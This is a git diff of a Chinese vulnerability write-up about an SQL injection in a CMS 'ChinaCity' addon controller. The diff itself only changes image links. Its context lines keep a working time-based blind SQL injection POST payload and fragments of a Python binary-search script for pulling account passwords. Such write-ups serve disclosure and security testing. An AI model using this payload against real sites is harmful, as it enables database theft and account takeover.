@@ -20,15 +20,15 @@ icon_hash="1167011145"
 
 登录页面如下
 
-![image-20220518154243943](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181542003.png)
+![image-20220518154243943](./images/202205181542003.png)
 
 存在漏洞的文件为`Addons/ChinaCity/Controller/ChinaCityController.class.php`
 
-![image-20220518154255819](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181542896.png)
+![image-20220518154255819](./images/202205181542896.png)
 
 其中用户可控参数为 cid 和 pid, 通过调试查看SQL语句
 
-![image-20220518154306977](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181543058.png)
+![image-20220518154306977](./images/202205181543058.png)
 
 通过构造请求闭合SQL语句，造成SQL注入
 
@@ -38,7 +38,7 @@ POST /index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action
 cid=0&pid[0]==(select*from(select+sleep(3)union/**/select+1)a)and+1+in+&pid[1]=1
 ```
 
-![image-20220518154329027](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181543124.png)
+![image-20220518154329027](./images/202205181543124.png)
 
 ```python
 通过二分法延时注入可以获取用户账号密码，登录后台
@@ -74,4 +74,4 @@ for i in range(1,100):
     print(flag)
 ```
 
-![image-20220518154353118](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181543205.png)
+![image-20220518154353118](./images/202205181543205.png)
